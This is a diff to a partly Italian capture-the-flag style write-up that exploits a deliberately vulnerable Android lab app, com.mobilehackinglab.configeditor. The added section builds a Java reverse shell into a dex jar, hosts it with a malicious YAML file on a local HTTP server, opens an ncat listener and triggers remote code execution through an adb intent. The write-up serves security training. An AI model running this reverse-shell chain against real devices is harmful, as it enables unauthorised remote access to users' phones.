@@ -125,7 +125,24 @@ output: pwn.txt # in listing file
 
 ## Shell is the way
 
-+ RCE yes, but where is the shell? method with c script and dalvikvm method
+Creare reverse shell in Java
+
+```sh
+javac --release 17 AndroidReverseShell.java
+mkdir classes
+/Users/dipa/Library/Android/sdk/build-tools/33.0.2/d8 AndroidReverseShell.class --intermediate --file-per-class --output classes
+mv classes/AndroidReverseShell.dex classes/classes.dex
+zip classes/reverse.jar classes/classes.dex
+# manual way, skip this, use only for testing
+adb push reverse.jar /data/data/com.mobilehackinglab.configeditor/
+/system/bin/dalvikvm -cp /data/data/com.mobilehackinglab.configeditor/reverse.jar AndroidReverseShell
+```
+
+```sh
+python3 -m http.server 8081 # shell.yaml and reverse.jar in this folder
+ncat -lnvp 1337 # listener for reverse shell
+adb shell am start -a android.intent.action.VIEW -d  "http://192.168.1.26:8081/shell.yaml" -n com.mobilehackinglab.configeditor/.MainActivity # emulate browser interaction
+```
 
 ## And now?
 
@@ -141,3 +158,4 @@ RCE / ACE su utente Android non ci dà molti privilegi e non possiamo muoverci l
 
 ## References
 
++ [android-command-line-reverse-shell](https://malacupa.com/2018/10/25/android-command-line-reverse-shell)
